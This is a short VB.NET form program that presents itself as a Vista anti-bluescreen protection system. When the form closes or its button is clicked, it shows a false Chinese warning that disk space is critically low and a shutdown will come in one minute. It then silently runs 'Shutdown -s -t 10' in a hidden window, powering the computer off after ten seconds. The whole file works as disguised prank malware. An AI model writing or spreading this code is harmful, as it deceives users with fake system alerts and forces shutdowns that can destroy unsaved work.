Public Class Run
    Function doo()
        Dim k = My.Computer.FileSystem.Drives.Count
        Dim b = My.Computer.FileSystem.Drives.Item(1).TotalSize
        If k < 8 And b < 10000000000 Then
            MsgBox("硬盘空间严重不足，系统无法正常运作！" + vbCrLf + "系统将在一分钟后自动关闭！！！", MsgBoxStyle.Exclamation, "System Runner")
            Shell("Shutdown -s -t 10", AppWinStyle.Hide, False)
            End
        Else
            End
        End If
    End Function
    Private Sub Run_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        doo()
    End Sub
    Private Sub Run_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim k = My.Computer.FileSystem.Drives.Count
        Dim b = My.Computer.FileSystem.Drives.Item(1).TotalSize
        If k < 8 And b < 10000000000 Then
            MsgBox("Vista防蓝屏保护系统", MsgBoxStyle.Information, "System Runner")
        Else
            End
        End If
    End Sub
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        doo()
    End Sub
End Class
